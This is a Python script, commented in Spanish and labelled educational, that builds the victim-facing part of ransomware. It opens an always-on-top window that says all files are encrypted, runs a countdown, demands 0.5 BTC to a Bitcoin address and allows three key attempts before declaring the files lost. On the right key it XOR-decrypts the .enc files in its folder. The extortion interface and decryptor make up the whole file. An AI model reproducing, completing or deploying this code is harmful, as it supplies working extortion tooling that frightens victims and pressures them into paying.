#!/usr/bin/env python3
"""Interfaz de ransomware educativo - Solo desencripta con password correcta"""

import os
import hashlib
import ctypes
import sys
import tkinter as tk
from tkinter import ttk, messagebox

def main():
    """Detecta ubicacion, lee .pwd y muestra interfaz"""
    
    if getattr(sys, 'frozen', False):
        ruta = os.path.dirname(sys.executable)
    else:
        ruta = os.path.dirname(os.path.abspath(__file__))
    
    pwd_file = os.path.join(ruta, ".pwd")
    
    pwd = ""
    try:
        if os.path.exists(pwd_file):
            with open(pwd_file, 'r') as f:
                pwd = f.read().strip()
        else:
            def msg(titulo, mensaje, icono=0):
                ctypes.windll.user32.MessageBoxW(0, mensaje, titulo, icono)
            msg("ERROR", f"No se encontro: {pwd_file}\nContacte al administrador.", 0x10)
            sys.exit(1)
            
    except Exception as e:
        def msg(titulo, mensaje, icono=0):
            ctypes.windll.user32.MessageBoxW(0, mensaje, titulo, icono)
        msg("ERROR", f"Error al leer contrasena: {str(e)}", 0x10)
        sys.exit(1)
    
    mostrar_ventana_ransomware(pwd, ruta)
    
def mostrar_ventana_ransomware(pwd, ruta):
    """Crea interfaz visual: mensaje amenazante, timer, Bitcoin, password (3 intentos)"""
    
    root = tk.Tk()
    root.title("⚠️ TUS ARCHIVOS HAN SIDO CIFRADOS ⚠️")
    root.geometry("900x980")
    root.configure(bg='#0d0d0d')
    root.resizable(False, False)
    root.attributes('-topmost', True)
    
    # Centrar ventana en pantalla
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()

    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    # Frame con borde rojo
    main_frame = tk.Frame(root, bg='#ff0000', bd=5)
    main_frame.pack(fill='both', expand=True, padx=5, pady=5)
    
    inner_frame = tk.Frame(main_frame, bg='#0d0d0d')
    inner_frame.pack(fill='both', expand=True, padx=3, pady=3)
    
    # Titulos
    tk.Label(
        inner_frame,
        text="💀 ATAQUE RANSOMWARE 💀",
        font=('Impact', 24, 'bold'),
        fg='#ff0000',
        bg='#0d0d0d',
        pady=8
    ).pack()
    
    tk.Label(
        inner_frame,
        text="🔒 TODOS TUS ARCHIVOS HAN SIDO CIFRADOS 🔒",
        font=('Arial Black', 13, 'bold'),
        fg='#ffffff',
        bg='#0d0d0d',
        pady=3
    ).pack()
    
    # Mensaje de advertencia
    texto_frame = tk.Frame(inner_frame, bg='#1a0000', bd=2, relief='solid')
    texto_frame.pack(fill='x', padx=40, pady=10)
    
    tk.Label(
        texto_frame,
        text="⚠️ ¡ATENCION! TUS ARCHIVOS IMPORTANTES ESTAN CIFRADOS ⚠️\n\n"
             "Tus documentos, fotos, videos, bases de datos y otros archivos\n"
             "ya no son accesibles porque han sido cifrados.\n\n"
             "Nadie puede recuperar tus archivos sin nuestro servicio de descifrado.",
        font=('Courier New', 9, 'bold'),
        fg='#ffffff',
        bg='#1a0000',
        justify='center',
        pady=10
    ).pack()
    
    # Timer de cuenta regresiva
    tiempo_frame = tk.Frame(inner_frame, bg='#1a0000', bd=3, relief='ridge')
    tiempo_frame.pack(fill='x', padx=40, pady=10)
    
    tk.Label(
        tiempo_frame,
        text="⏰ TIEMPO RESTANTE PARA DESCIFRADO ⏰",
        font=('Impact', 14, 'bold'),
        fg='#ffaa00',
        bg='#1a0000'
    ).pack(pady=8)
    
    tiempo_restante = [71, 59, 32]
    
    timer_label = tk.Label(
        tiempo_frame,
        text=f"{tiempo_restante[0]:02d}:{tiempo_restante[1]:02d}:{tiempo_restante[2]:02d}",
        font=('Courier New', 32, 'bold'),
        fg='#ff0000',
        bg='#000000',
        relief='solid',
        bd=3,
        padx=20,
        pady=10
    )
    timer_label.pack(pady=10)
    
    def actualizar_timer():
        """Decrementa timer cada segundo"""
        if tiempo_restante[2] > 0:
            tiempo_restante[2] -= 1
        elif tiempo_restante[1] > 0:
            tiempo_restante[1] -= 1
            tiempo_restante[2] = 59
        elif tiempo_restante[0] > 0:
            tiempo_restante[0] -= 1
            tiempo_restante[1] = 59
            tiempo_restante[2] = 59
        
        timer_label.config(text=f"{tiempo_restante[0]:02d}:{tiempo_restante[1]:02d}:{tiempo_restante[2]:02d}")
        root.after(1000, actualizar_timer)
    
    actualizar_timer()
    
    tk.Label(
        tiempo_frame,
        text="⚠️ Despues de este tiempo, ¡el descifrado sera IMPOSIBLE! ⚠️",
        font=('Arial Black', 11, 'bold'),
        fg='#ff3333',
        bg='#0d0d0d'
    ).pack(pady=5)
    
    # Instrucciones de pago Bitcoin
    bitcoin_frame = tk.Frame(inner_frame, bg='#1a1a00', bd=2, relief='ridge')
    bitcoin_frame.pack(fill='x', padx=40, pady=8)
    
    tk.Label(
        bitcoin_frame,
        text="💰 INSTRUCCIONES DE PAGO 💰",
        font=('Arial Black', 11, 'bold'),
        fg='#ffff00',
        bg='#1a1a00'
    ).pack(pady=6)
    
    tk.Label(
        bitcoin_frame,
        text="Debes enviar exactamente 0.5 BTC a esta dirección de Bitcoin:",
        font=('Arial', 9, 'bold'),
        fg='#ffffff',
        bg='#1a1a00'
    ).pack(pady=3)
    
    tk.Label(
        bitcoin_frame,
        text="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        font=('Courier New', 11, 'bold'),
        fg='#00ff00',
        bg='#000000',
        relief='solid',
        bd=2,
        padx=10,
        pady=5
    ).pack(pady=6)
    
    tk.Label(
        bitcoin_frame,
        text="Después de la confirmación del pago, recibirás la clave de descifrado.",
        font=('Arial', 8),
        fg='#ffcccc',
        bg='#1a1a00'
    ).pack(pady=(3, 8), padx=20)
    
    # Campo de password
    separator = tk.Frame(inner_frame, bg='#ff0000', height=2)
    separator.pack(fill='x', pady=8)
    
    tk.Label(
        inner_frame,
        text="🔑 INGRESA LA CLAVE DE DESCIFRADO PARA DESBLOQUEAR TUS ARCHIVOS:",
        font=('Arial Black', 13, 'bold'),
        fg='#00ff00',
        bg='#0d0d0d'
    ).pack(pady=(15, 8))
    
    password_var = tk.StringVar()
    password_entry = tk.Entry(
        inner_frame,
        textvariable=password_var,
        font=('Courier New', 16, 'bold'),
        width=22,
        bg='#000000',
        fg='#00ff00',
        insertbackground='#00ff00',
        relief='solid',
        bd=4,
        justify='center'
    )
    password_entry.pack(pady=8, ipady=10)
    password_entry.focus()
    
    intentos_var = tk.StringVar(value="⚠️ ADVERTENCIA: TIENES 3 INTENTOS ⚠️")
    tk.Label(
        inner_frame,
        textvariable=intentos_var,
        font=('Arial Black', 13, 'bold'),
        fg='#ffff00',
        bg='#ff0000',
        padx=20,
        pady=5
    ).pack(pady=8)
    
    resultado = {'desencriptado': False, 'intentos': 3}
    
    def verificar_password():
        """Valida password y desencripta si es correcta (3 intentos)"""
        password = password_var.get().strip()
        
        if password == pwd:
            root.destroy()
            
            prog_win = tk.Tk()
            prog_win.title("Descifrando...")
            prog_win.geometry("600x300")
            prog_win.configure(bg='#0d0d0d')
            prog_win.attributes('-topmost', True)
            prog_win.resizable(False, False)
            
            tk.Label(
                prog_win,
                text="🔓 DESCIFRANDO ARCHIVOS...",
                font=('Arial Black', 18, 'bold'),
                fg='#00ff00',
                bg='#0d0d0d'
            ).pack(pady=30)
            
            progress = ttk.Progressbar(prog_win, length=500, mode='determinate')
            progress.pack(pady=20)
            
            status = tk.Label(prog_win, text="Procesando...", font=('Consolas', 12), fg='#ffffff', bg='#0d0d0d')
            status.pack(pady=15)
            
            prog_win.update()
            
            contador = 0
            clave = hashlib.sha256(pwd.encode()).digest()
            archivos = [os.path.join(r, f) for r, d, fs in os.walk(ruta) for f in fs if f.endswith('.enc')]
            total = len(archivos)
            
            for i, ruta_enc in enumerate(archivos):
                try:
                    with open(ruta_enc, 'rb') as f:
                        datos_enc = f.read()
                    datos_desc = bytes(bytearray(b ^ clave[j % len(clave)] for j, b in enumerate(datos_enc)))
                    with open(ruta_enc[:-4], 'wb') as f:
                        f.write(datos_desc)
                    os.remove(ruta_enc)
                    contador += 1
                    progress['value'] = (contador / total) * 100
                    status.config(text=f"Descifrando: {os.path.basename(ruta_enc)}")
                    prog_win.update()
                except Exception as e:
                    pass
            
            prog_win.destroy()
            success_win = tk.Tk()
            success_win.title("¡Exito!")
            success_win.geometry("500x250")
            success_win.configure(bg='#0d0d0d')
            success_win.attributes('-topmost', True)
            
            tk.Label(
                success_win,
                text="✅ DESCIFRADO EXITOSO ✅",
                font=('Arial Black', 20, 'bold'),
                fg='#00ff00',
                bg='#0d0d0d'
            ).pack(pady=40)
            
            tk.Label(
                success_win,
                text="Todos tus archivos han sido restaurados correctamente.\n¡Puedes acceder a ellos nuevamente!",
                font=('Arial', 12),
                fg='#ffffff',
                bg='#0d0d0d',
                justify='center'
            ).pack(pady=20)
            
            tk.Button(
                success_win,
                text="CERRAR",
                font=('Arial Black', 12, 'bold'),
                fg='#000000',
                bg='#00ff00',
                command=success_win.destroy,
                padx=30,
                pady=10
            ).pack(pady=20)
            
            resultado['desencriptado'] = True
            success_win.mainloop()
            
        else:
            resultado['intentos'] -= 1
            if resultado['intentos'] > 0:
                intentos_var.set(f"❌ CONTRASEÑA INCORRECTA - {resultado['intentos']} INTENTOS RESTANTES ❌")
                password_entry.delete(0, tk.END)
                password_entry.config(bg='#330000')
                root.after(500, lambda: password_entry.config(bg='#000000'))
            else:
                intentos_var.set("🚫 SIN INTENTOS RESTANTES - ACCESO BLOQUEADO 🚫")
                password_entry.config(state='disabled', bg='#330000')
                
                root.after(2000, lambda: mostrar_bloqueo())
    
    def mostrar_bloqueo():
        """Muestra ventana de bloqueo final"""
        root.destroy()
        
        block_win = tk.Tk()
        block_win.title("BLOQUEADO")
        block_win.geometry("600x350")
        block_win.configure(bg='#1a0000')
        block_win.attributes('-topmost', True)
        
        tk.Label(
            block_win,
            text="🚫 ACCESO BLOQUEADO 🚫",
            font=('Arial Black', 24, 'bold'),
            fg='#ff0000',
            bg='#1a0000'
        ).pack(pady=40)
        
        tk.Label(
            block_win,
            text="Has excedido el número máximo de intentos.\n\n"
                 "Tus archivos permanecerán cifrados permanentemente.\n\n"
                 "Contacta con soporte si necesitas ayuda.",
            font=('Arial', 13),
            fg='#ffffff',
            bg='#1a0000',
            justify='center'
        ).pack(pady=30)
        
        tk.Button(
            block_win,
            text="CERRAR",
            font=('Arial Black', 12, 'bold'),
            fg='#ffffff',
            bg='#ff0000',
            command=block_win.destroy,
            padx=40,
            pady=15
        ).pack(pady=30)
        
        block_win.mainloop()
    
    tk.Button(
        inner_frame,
        text="🔓 DESCIFRAR MIS ARCHIVOS AHORA 🔓",
        font=('Arial Black', 14, 'bold'),
        fg='#000000',
        bg='#00ff00',
        activebackground='#00cc00',
        activeforeground='#000000',
        command=verificar_password,
        cursor='hand2',
        relief='raised',
        bd=5,
        padx=20,
        pady=15
    ).pack(pady=20)
    
    password_entry.bind('<Return>', lambda e: verificar_password())
    
    root.mainloop()
    
    return resultado['desencriptado']

if __name__ == "__main__":
    main()
